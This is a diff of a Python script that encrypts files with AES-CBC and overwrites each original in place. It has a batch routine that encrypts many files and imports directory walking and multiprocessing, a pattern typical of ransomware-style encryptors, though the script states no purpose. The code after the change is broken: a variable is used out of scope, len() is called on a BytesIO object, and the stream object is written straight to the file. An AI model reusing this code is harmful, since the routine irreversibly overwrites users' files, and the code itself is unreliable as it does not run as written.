@@ -7,6 +7,7 @@ from Crypto.Cipher import AES
 import threading
 import os
 import sys
+import io
 from os import walk
 import multiprocessing
 import secrets
@@ -22,16 +23,17 @@ def Encrypt(fileToEncrypt, iv, aes_obj):
     print("encrypting " + fileToEncrypt)
     print("original size: " + str(os.path.getsize(fileToEncrypt)))
     with open(fileToEncrypt, 'rb') as infile:
-        encrypted = encrypted + file_size
-        encrypted = encrypted + str(iv)
+        bytesStream = io.BytesIO(file_size.encode('utf-8'))
+        bytesStream.write(iv)
         while True:
             chunk = infile.read(64 * 1024)
             if len(chunk) == 0:
                 break
             elif len(chunk) % 16 != 0:
                 chunk += b' ' * (16 - (len(chunk) % 16))
-            encrypted = encrypted + str(aes_obj.encrypt(chunk))
-    return encrypted
+            bytesStream.write(aes_obj.encrypt(chunk))
+    print("encrypted size: " + str(len(bytesStream)))
+    return bytesStream
 
 def EncryptFile(fileToEncrypt, key):
     file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
@@ -39,10 +41,9 @@ def EncryptFile(fileToEncrypt, key):
     
     iv = secrets.token_bytes(16)
     aes_obj = AES.new(key, AES.MODE_CBC, iv)
-    encrypted_content = Encrypt(fileToEncrypt, iv, aes_obj)
+    encrypted_content_byte_stream = Encrypt(fileToEncrypt, iv, aes_obj)
     with open(fileToEncrypt, 'wb') as outfile:
-        print("encrypted size: " + str(len(encrypted_content)))
-        outfile.write(encrypted_content.encode())
+        outfile.write(encrypted_content_byte_stream)
 
 def EncryptAllFiles(filesToEncrypt, key):
     for file_to_encrypt in filesToEncrypt:
